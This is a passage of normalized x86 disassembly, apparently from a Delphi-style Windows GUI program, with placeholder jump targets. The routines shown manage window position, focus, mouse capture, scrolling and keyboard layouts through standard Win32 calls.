mov ecx [ eax ]
call [ ecx - 0x10 ]
push ebp
mov eax ebx
call sub_442ce8
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x2d
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
jne r-xdata
call GetCapture
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp ebx [ eax + 0x44 ]
je r-xdata
mov eax ebx
call sub_454618
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb017
mov eax esi
call sub_43e62c
test eax eax
jne r-xdata
sub_442e40
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_4418e0
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_442e60
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov si [ ebx + 0x4 ]
cmp si 0x1
je r-xdata
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_4418e0
test al al
jne r-xdata
cmp si 0x2
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_442e94
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_4418e0
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_442eb4
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
movzx eax [ rw-data ]
push eax
mov eax [ esi + 0x180 ]
push eax
call RemovePropA
movzx eax [ rw-data ]
push eax
mov eax [ esi + 0x180 ]
push eax
call RemovePropA
pop esi
retn
sub_442f04
push esi
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov [ edx + 0xc ] 0x1
pop esi
retn
sub_442f28
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] dl
mov ebp eax
mov dl [ esp ]
mov eax ebp
call sub_43c750
mov ebx eax
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_440990
mov edi eax
dec edi
cmp edi 0x0
jl r-xdata
test [ esp ] bl
jne r-xdata
mov edx edi
mov eax ebp
call sub_440954
mov dl [ esp ]
mov si 0xffd1
call sub_403320
or bl al
dec edi
cmp edi 0xffffffff
jne r-xdata
sub_442f80
push ebx
push esi
push edi
mov edi edx
mov ebx eax
or [ ebx + 0x54 ] 0x4
mov dl 0x1
mov eax ebx
mov si 0xffd1
call sub_403320
and eax 0x7f
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_442fa4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor edx edx
mov eax ebx
mov si 0xffd1
call sub_403320
and eax 0x7f
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_442fdc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43f100
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov dx 0xb03d
mov eax ebx
call sub_4409f0
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax ebx
call sub_441200
sub_443014
push ebx
push esi
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov eax ebx
mov si 0xffc2
call sub_403320
pop esi
pop ebx
retn
mov eax ebx
call sub_43dabc
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x3c ]
call sub_4043b8
push eax
call LoadKeyboardLayoutA
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x38 ]
call sub_4043b8
push eax
call LoadKeyboardLayoutA
jmp r-xdata
sub_443094
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4415e0
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_43f1d4
sub_4430f4
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_441354
test [ ebx + 0x51 ] 0x4
je r-xdata
xor edx edx
mov eax ebx
call sub_440750
pop ebx
retn
sub_443124
xor edx edx
mov dl [ eax + 0x1a6 ]
movzx edx [ edx * 2 + rw-data ]
push edx
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ eax + 0x180 ]
push eax
call SetWindowPos
retn
sub_44314c
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax ebx
call sub_443f64
test al al
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor edx edx
mov eax ebx
call sub_440750
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
neg al
sbb eax eax
push eax
mov eax [ ebx + 0x180 ]
push eax
call EnableWindow
sub_4431bc
push ebx
mov ebx eax
mov eax ebx
call sub_43f040
mov eax ebx
call sub_443f64
test al al
je r-xdata
mov dx 0xb008
mov eax ebx
call sub_4409f0
pop ebx
retn
push 0x0
mov eax [ ebx + 0x68 ]
call sub_41de94
mov ecx eax
mov edx 0x30
mov eax ebx
call sub_43e62c
sub_4431f8
push ebx
add esp 0xfffffff8
mov ebx eax
call GetCapture
test eax eax
jne r-xdata
pop ecx
pop edx
pop ebx
retn
push esp
call GetCursorPos
mov eax esp
xor edx edx
call sub_43bd30
cmp ebx eax
jne r-xdata
push 0x1
mov eax ebx
call sub_443c60
mov ecx eax
mov edx 0x20
mov eax ebx
call sub_43e62c
sub_443238
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_443f64
test al al
je r-xdata
pop esi
retn
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_443c60
push eax
call SetWindowPos
cmp [ esi + 0x57 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_443278
push ebx
mov ebx eax
test [ ebx + 0x50 ] 0x10
je r-xdata
mov dx 0xb011
mov eax ebx
call sub_4409f0
pop ebx
retn
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_443f64
test al al
je r-xdata
mov eax [ ebx + 0x180 ]
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov eax ebx
call sub_443b68
sub_4432b8
push ebx
mov ebx eax
cmp [ ebx + 0x1a9 ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov dl [ eax + 0x1a5 ]
mov eax ebx
call sub_443da0
cmp [ edx + 0x8 ] 0x0
setne al
mov edx eax
mov eax ebx
call sub_443da0
jmp r-xdata
mov [ ebx + 0x1a9 ] 0x1
sub_443318
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov edi [ ebx + 0x8 ]
mov al [ ebx + 0x4 ]
sub al 0x4
jb r-xdata
cmp [ edi + 0xc ] 0x0
je r-xdata
dec al
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ edi + 0xc ]
call sub_43e088
jmp r-xdata
push 0x0
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
call sub_43cfc8
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax esi
call sub_44154c
mov ebp eax
mov [ ebx + 0xc ] ebp
test ebp ebp
jne r-xdata
jmp r-xdata
mov [ ebx + 0xc ] esi
sub_443388
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43f178
mov edx esi
mov eax ebx
call sub_4409b0
pop esi
pop ebx
retn
sub_4433a4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp edx
mov [ esp ] eax
mov [ esp + 0x4 ] 0x1
mov eax [ esp ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx [ ebp + 0x8 ]
movzx edx [ ebp + 0x4 ]
mov eax 0xb016
call sub_43a36c
test eax eax
jne r-xdata
mov ebx [ esp ]
test ebx ebx
je r-xdata
mov al [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x4 ] 0x0
mov eax [ esp ]
call sub_454618
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
mov si 0xffd6
call sub_403320
mov edi eax
test edi edi
je r-xdata
mov edx ebp
mov eax ebx
mov si 0xffab
call sub_403320
test al al
jne r-xdata
mov ebx [ ebx + 0x30 ]
test ebx ebx
jne r-xdata
cmp [ edi + 0x38 ] 0x0
je r-xdata
mov edx ebp
mov eax edi
mov si 0xffef
call sub_403320
test al al
jne r-xdata
sub_443438
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov [ esi + 0xc ] 0x1
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_444d18
mov edx esi
mov eax ebx
call sub_4433a4
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
push ebx
movzx ecx [ esi + 0x4 ]
mov edx 0xb02e
mov eax ebx
call sub_43e62c
test eax eax
jne r-xdata
xor edi edi
movzx eax [ esi + 0x4 ]
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
mov edi 0x1
jmp r-xdata
sub eax 0x2
je r-xdata
mov edi 0x4
sub eax 0x3
je r-xdata
test edi edi
je r-xdata
jmp r-xdata
push 0x0
movzx ecx [ esi + 0x4 ]
mov edx 0xb01e
mov eax ebx
call sub_43e62c
test eax eax
jne r-xdata
sub eax 0x6
je r-xdata
push 0x0
xor ecx ecx
mov edx 0x87
mov eax ebx
call sub_43e62c
test eax edi
jne r-xdata
mov edi 0x2
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_454618
movzx ecx [ esi + 0x4 ]
mov edx 0xb005
call sub_43e62c
test eax eax
jne r-xdata
jmp r-xdata
sub_44351c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov di [ esi + 0x4 ]
movzx eax di
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
push 0x0
movzx ecx di
mov edx 0xb01e
mov eax ebx
call sub_43e62c
mov [ esi + 0xc ] eax
sub eax 0x2
jne r-xdata
sub eax 0x3
je r-xdata
sub eax 0x6
je r-xdata
sub eax 0x4
je r-xdata
jmp r-xdata
sub_443570
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
push 0x0
xor ecx ecx
mov edx 0x87
mov eax ebx
call sub_43e62c
test al 0x80
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_454618
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
call sub_43e62c
test eax eax
jne r-xdata
sub_4435bc
push ebx
push esi
mov esi edx
mov ebx eax
mov [ esi + 0xc ] 0x1
mov edx esi
mov eax ebx
call sub_4433a4
test al al
jne r-xdata
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
push ebx
movzx ecx [ esi + 0x4 ]
mov edx 0xb02e
mov eax ebx
call sub_43e62c
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_454618
movzx ecx [ esi + 0x4 ]
mov edx 0xb005
call sub_43e62c
test eax eax
jne r-xdata
sub_443618
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x20
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_454618
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
call sub_43e62c
mov [ esi + 0xc ] eax
sub_44364c
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x40 ]
jne r-xdata
mov eax ebx
call sub_443f64
test al al
je r-xdata
cmp edi [ ebx + 0x44 ]
jne r-xdata
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x44 ] edi
mov eax [ ebp + 0xc ]
mov [ ebx + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_443f64
test al al
je r-xdata
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
jne r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax ebx
call sub_43cad8
mov eax ebx
mov si 0xffd0
call sub_403320
mov [ ebp - 0x2c ] 0x2c
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call GetWindowPlacement
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_43ce24
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPlacement
push 0x14
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
push 0x0
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_443724
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov eax ebp
call sub_440990
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov edx edi
mov eax ebp
call sub_440954
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov si 0xffec
call sub_403320
inc edi
dec ebx
jne r-xdata
sub_44376c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4404f8
xor eax eax
push ebp
push sub_44380a
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_443724
cmp esi ebx
je r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43d0a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443811
mov eax [ ebp - 0x4 ]
call sub_440500
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x20
je r-xdata
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fa ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fa ] eax
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fe ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fe ] eax
sub_443818
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edi eax
mov ebx [ edi + 0x180 ]
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push ebx
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp + 0x8 ] al
cmp [ esp + 0x8 ] 0x0
je r-xdata
mov al 0x1
mov eax edi
call sub_440990
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x0
push 0x0
mov eax [ esp + 0xc ]
push eax
mov eax [ esp + 0xc ]
push eax
mov eax [ edi + 0x180 ]
push eax
call ScrollWindow
mov eax edi
call sub_440520
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov eax [ esp ]
add [ ebx + 0x40 ] eax
mov eax [ esp + 0x4 ]
add [ ebx + 0x44 ] eax
jmp r-xdata
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
inc ebp
dec esi
jne r-xdata
cmp [ esp + 0x8 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
call sub_440954
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
push 0x14
mov eax ebx
mov edx [ eax + 0x4c ]
push edx
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x44 ]
add edx [ esp + 0x10 ]
push edx
mov edx [ eax + 0x40 ]
add edx [ esp + 0x10 ]
push edx
push 0x0
mov eax [ eax + 0x180 ]
push eax
call SetWindowPos
sub_443908
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ eax + 0x198 ]
test edx edx
je r-xdata
mov eax [ eax + 0x19c ]
mov edx ebx
call sub_414164
mov edi eax
test edi edi
jl r-xdata
sub esi [ edx + 0x8 ]
cmp [ ebx + 0x180 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x19c ]
mov eax [ edx + 0x8 ]
test esi esi
jge r-xdata
test esi esi
jne r-xdata
cmp eax esi
jg r-xdata
xor esi esi
mov eax [ ebx + 0x30 ]
mov ebp [ eax + 0x19c ]
mov eax [ ebp + 0x8 ]
dec eax
cmp esi eax
jne r-xdata
mov eax 0x1
jmp r-xdata
cmp edi esi
je r-xdata
mov esi eax
dec esi
cmp edi esi
jge r-xdata
xor eax eax
jmp r-xdata
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
mov eax edx
mov edx edi
call sub_413ff8
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x19c ]
mov ecx ebx
mov edx esi
call sub_414184
cmp edi esi
jle r-xdata
lea edx [ esi + 0x1 ]
mov eax ebp
call sub_414108
call sub_443c60
jmp r-xdata
mov eax ebp
mov edx esi
call sub_414108
call sub_443c60
sub_4439e0
push ebx
push esi
mov ebx [ eax + 0x30 ]
test ebx ebx
je r-xdata
mov ecx [ eax + 0x180 ]
test ecx ecx
je r-xdata
test dl dl
je r-xdata
pop esi
pop ebx
retn
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
and edx 0x7f
movzx edx [ edx * 2 + rw-data ]
push edx
push ecx
call SetWindowPos
xor ecx ecx
mov edx [ ebx + 0x19c ]
mov ecx [ edx + 0x8 ]
dec ecx
jmp r-xdata
add ecx edx
mov edx ecx
call sub_443908
pop esi
pop ebx
retn
mov edx [ esi + 0x8 ]
xor edx edx
mov esi [ ebx + 0x198 ]
test esi esi
je r-xdata
sub_443a40
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_443c60
push eax
call GetDC
push 0x12
push 0x0
mov eax ebx
call sub_443c60
push eax
call GetDCEx
jmp r-xdata
mov edx [ ebx + 0x180 ]
mov [ esi ] edx
pop esi
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b724
call sub_4038b0
test eax eax
jne r-xdata
sub_443aa4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_443f64
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
push 0x0
mov ecx 0x1
mov edx 0xb034
call sub_43e62c
test [ ebx + 0x50 ] 0x40
setne al
xor al 0x1
neg al
sbb eax eax
push eax
push 0x0
mov eax [ ebx + 0x180 ]
push eax
call InvalidateRect
call sub_4335f0
call sub_4336d0
test al al
je r-xdata
mov eax ebx
call sub_440990
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_440954
mov edx [ eax ]
call [ edx + 0x7c ]
mov edx esi
mov eax ebx
call sub_440954
test [ eax + 0x52 ] 0x4
je r-xdata
sub_443b68
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_43ce24
push 0x1
push 0x1
lea eax [ esp + 0x8 ]
push eax
call InflateRect
push 0xffffffff
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x180 ]
push eax
call InvalidateRect
add esp 0x10
pop ebx
retn
sub_443ba0
push ebx
push esi
push ecx
mov ebx eax
mov [ esp ] 0x0
mov eax ebx
call sub_454618
mov esi eax
test esi esi
je r-xdata
mov al [ esp ]
pop edx
pop esi
pop ebx
retn
cmp esi ebx
je r-xdata
mov [ esp ] 0x1
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov ebx [ ebx + 0x30 ]
cmp esi ebx
jne r-xdata
sub_443be0
push ebx
mov ebx eax
mov eax ebx
call sub_454618
test eax eax
je r-xdata
cmp [ ebx + 0x190 ] 0x0
je r-xdata
mov edx ebx
call sub_458384
pop ebx
retn
mov eax ebx
call sub_454640
mov eax ebx
call sub_443c60
push eax
call SetFocus
jmp r-xdata
pop ebx
retn
sub_443c18
push ebx
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
call GetFocus
cmp eax [ ebx + 0x180 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_443c3c
push ebx
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x94 ]
call sub_443c3c
sub_443c74
push ebx
push esi
push edi
push ebp
mov ebx edx
mov edi eax
push 0x0
push ebx
xor ecx ecx
mov edx 0x7fffffff
mov eax 0x7fffffff
call sub_412cd4
mov eax edi
call sub_440990
mov esi eax
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov edx [ ebx ]
cmp edx [ eax + 0x40 ]
jle r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
mov edx [ ebx + 0x4 ]
cmp edx [ eax + 0x44 ]
jle r-xdata
mov edx [ eax + 0x40 ]
mov [ ebx ] edx
inc ebp
dec esi
jne r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp edx [ ebx + 0x8 ]
jle r-xdata
mov edx [ eax + 0x44 ]
mov [ ebx + 0x4 ] edx
mov edx ebp
mov eax edi
call sub_440954
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp edx [ ebx + 0xc ]
jle r-xdata
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
mov [ ebx + 0x8 ] edx
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
mov [ ebx + 0xc ] edx
sub_443d08
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov [ ebx ] eax
xor eax eax
mov [ ebx + 0x4 ] eax
push ebx
mov eax esi
call sub_443c60
push eax
call ClientToScreen
pop esi
pop ebx
retn
sub_443d40
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_443f64
test al al
je r-xdata
push 0x16
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_443c60
push eax
call SetWindowPos
mov eax ebx
mov si 0xffd0
call sub_403320
sub_443dfc
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
or eax 0xffffffff
pop esi
pop ebx
retn
mov eax [ esi + 0x194 ]
mov edx ebx
call sub_414164
pop esi
pop ebx
retn
sub_443e20
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax ebx
call sub_443dfc
movsx eax ax
test eax eax
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x30 ]
mov ebp [ edx + 0x194 ]
mov edx [ ebp + 0x8 ]
test si si
jge r-xdata
movsx ecx si
cmp edx ecx
jg r-xdata
xor esi esi
movsx edi si
cmp eax edi
je r-xdata
mov esi edx
dec esi
mov edx ebp
xchg edx eax
call sub_413ff8
mov edx edi
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x194 ]
mov ecx ebx
call sub_414184
sub_443e94
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x1a4 ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x1a4 ] bl
mov eax esi
call sub_443f64
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb028
mov eax esi
call sub_43e62c
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
and eax 0xfffeffff
test bl bl
je r-xdata
push eax
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call SetWindowLongA
or eax 0x10000
sub_443ef4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_443f58
push [ fs : eax ]
mov [ fs : eax ] esp
cmp dl [ ebx + 0x1a7 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443f5f
lea eax [ ebp - 0x4 ]
call sub_405598
retn
mov [ ebx + 0x1a7 ] dl
test [ ebx + 0x1c ] 0x10
setne al
xor al 0x1
test al dl
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
mov si 0xffc6
call sub_403320
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x17c ]
call sub_4055b0
sub_443f70
push ebx
push esi
push edi
add esp 0xffffffc4
mov ebx eax
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
je r-xdata
push esp
mov eax [ ebx + 0x180 ]
push eax
call GetWindowRect
mov [ esp + 0x10 ] 0x2c
lea eax [ esp + 0x10 ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call GetWindowPlacement
lea esi [ esp + 0x2c ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
mov eax [ esp ]
mov [ ebx + 0x40 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x44 ] eax
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ ebx + 0x48 ] eax
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_43cad8
add esp 0x3c
pop edi
pop esi
pop ebx
retn
push 0xfffffff8
mov eax [ ebx + 0x180 ]
push eax
call GetWindowLongA
mov esi eax
test esi esi
je r-xdata
push 0xfffffff0
mov eax [ ebx + 0x180 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
push esp
push esi
call ScreenToClient
lea eax [ esp + 0x8 ]
push eax
push esi
call ScreenToClient
sub_444028
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebp eax
mov eax [ ebp + 0x194 ]
test eax eax
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ esp + 0x4 ] 0x0
mov eax [ ebp + 0x194 ]
mov edx [ esp + 0x4 ]
call sub_414108
mov ebx eax
mov edx ebx
mov eax [ esp ]
call sub_413fac
mov edx [ esp ]
mov eax ebx
mov si 0xffb4
call sub_403320
inc [ esp + 0x4 ]
dec edi
jne r-xdata
sub_444088
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x5 ] cl
mov edi edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_44417e
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov si 0xffb4
call sub_403320
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
